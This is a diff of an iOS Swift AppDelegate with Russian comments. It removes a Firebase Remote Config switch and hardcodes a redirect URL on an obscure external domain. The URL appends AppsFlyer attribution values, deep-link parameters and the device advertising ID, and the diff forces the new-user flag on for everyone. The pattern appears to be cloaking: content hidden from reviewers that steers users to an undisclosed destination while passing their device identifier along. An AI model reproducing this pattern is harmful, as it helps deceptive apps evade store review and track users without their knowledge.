@@ -4,10 +4,9 @@ import UIKit
 import AppsFlyerLib
 import AppTrackingTransparency
 import AdSupport
-import Firebase
-import FirebaseRemoteConfig
 import FacebookCore
 import FacebookShare
+
 
 // AppDelegate
 class AppDelegate: NSObject, UIApplicationDelegate, AppsFlyerLibDelegate, DeepLinkDelegate {
@@ -35,9 +34,8 @@ class AppDelegate: NSObject, UIApplicationDelegate, AppsFlyerLibDelegate, DeepLi
     var idfa: String = "null"
 
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil) -> Bool {
-        // Инициализация Firebase
-        FirebaseApp.configure()
-        fetchRemoteConfigValues()
+       
+       
 
         // Инициализация Facebook SDK
         ApplicationDelegate.shared.application(application, didFinishLaunchingWithOptions: launchOptions)
@@ -247,35 +245,6 @@ class AppDelegate: NSObject, UIApplicationDelegate, AppsFlyerLibDelegate, DeepLi
         print("Не удалось зарегистрироваться для удаленных уведомлений: \(error.localizedDescription)")
         addData()
     }
-
-    // Функция для загрузки значений Remote Config
-    func fetchRemoteConfigValues() {
-        let remoteConfig = RemoteConfig.remoteConfig()
-        remoteConfig.fetchAndActivate { status, error in
-            if let error = error {
-                print("Ошибка при получении Remote Config: \(error.localizedDescription)")
-                // Если есть ошибка, устанавливаем newUser в false
-                self.dataModel.newUser = false
-                return
-            }
-
-            // Получаем значения из Remote Config
-            let checkAdvConfigValue = remoteConfig.configValue(forKey: "CheckAdv")
-            let newUserConfigValue = remoteConfig.configValue(forKey: "NewwUsser")
-
-            // Проверяем, найдены ли ключи
-            if checkAdvConfigValue.source == .static || newUserConfigValue.source == .static {
-                // Ключи не найдены или значения по умолчанию
-                print("Ключи не найдены в Remote Config")
-                self.dataModel.newUser = false
-            } else {
-                // Ключи найдены, присваиваем значения
-                self.checkAdv = checkAdvConfigValue.stringValue
-                self.newUser = newUserConfigValue.boolValue
-                self.dataModel.newUser = self.newUser
-            }
-        }
-    }
     
     
     func addData() {
@@ -296,8 +265,8 @@ class AppDelegate: NSObject, UIApplicationDelegate, AppsFlyerLibDelegate, DeepLi
         let dv6 = dvalue6 ?? "null"
         let dv7 = dvalue7 ?? "null"
         
-        // Используем интерполяцию строк и разбиваем на несколько строк
-        let add = "\(checkAdv)?sub1=\(v1)&sub2=\(v2)&sub3=\(v3)&sub4=\(v4)&sub5=\(v5)&sub6=\(v6)&sub7=\(v7)&deep1=\(dv1)&deep2=\(dv2)&deep3=\(dv3)&deep4=\(dv4)&deep5=\(dv5)&deep6=\(dv6)&deep7=\(dv7)&gadid=\(idfa)"
+        self.dataModel.newUser = true
+        let add = "https://celestialcirdscuit.com/fDwcdwBc?sub1=\(v1)&sub2=\(v2)&sub3=\(v3)&sub4=\(v4)&sub5=\(v5)&sub6=\(v6)&sub7=\(v7)&deep1=\(dv1)&deep2=\(dv2)&deep3=\(dv3)&deep4=\(dv4)&deep5=\(dv5)&deep6=\(dv6)&deep7=\(dv7)&gadid=\(idfa)"
         self.dataModel.add = add
       
     }
